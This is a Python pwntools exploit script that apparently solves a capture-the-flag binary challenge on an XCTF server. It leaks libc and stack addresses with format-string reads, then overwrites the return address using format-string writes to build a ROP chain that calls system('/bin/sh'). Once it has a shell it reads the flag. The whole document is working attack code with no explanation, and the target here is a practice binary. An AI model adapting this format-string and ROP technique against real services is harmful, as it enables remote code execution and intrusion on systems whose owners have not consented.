from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./main"
elf = ELF(vuln_path)
libc = elf.libc

io = process(vuln_path) if not f_remote else remote("pwn-52a7020eca.challenge.xctf.org.cn", 9999, ssl=True) 


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


# ddebug("b *0x4012F4 \n continue")

io.sendlineafter("input:\n", b"%19$p")
data = int(io.recvline(), 16)
libc.address = data - (0x7f8b19d80083-   0x7f8b19d5c000 )
log.success("libc.address :-----> " + hex(libc.address))

io.sendlineafter("input:\n", b"%16$p")
data = int(io.recvline(), 16)
ret_addr = data - (0x9070-0x8f88)
log.success("ret_addr:-----> " + hex(ret_addr))

pop_rdi = 0x401383
ret = 0x000000000040101a
system_addr = libc.symbols.get("system")
binsh_addr = next(libc.search("/bin/sh"))

payload = fmtstr_payload(8, {ret_addr-8:0x00404020+0x500}, write_size="byte")
payload = payload.ljust(0x40, b"\x00")
io.sendafter("input:\n", payload)


payload = fmtstr_payload(8, {ret_addr:pop_rdi}, write_size="byte")
payload = payload.ljust(0x40, b"\x00")
io.sendafter("input:\n", payload)


payload = fmtstr_payload(8, {ret_addr+8:binsh_addr}, write_size="short")
payload = payload.ljust(0x40, b"\x00")
io.sendafter("input:\n", payload)

payload = fmtstr_payload(8, {ret_addr+8*2:ret}, write_size="short")
payload = payload.ljust(0x40, b"\x00")
io.sendafter("input:\n", payload)

payload = fmtstr_payload(8, {ret_addr+8*3:system_addr}, write_size="short")
payload = payload.ljust(0x40, b"\x00")
io.sendafter("input:\n", payload)

ddebug("b *0x4012F4 \n8continue")
io.sendlineafter("input:\n", b"Q\x00")

io.sendline(b"cat flag")
io.interactive()
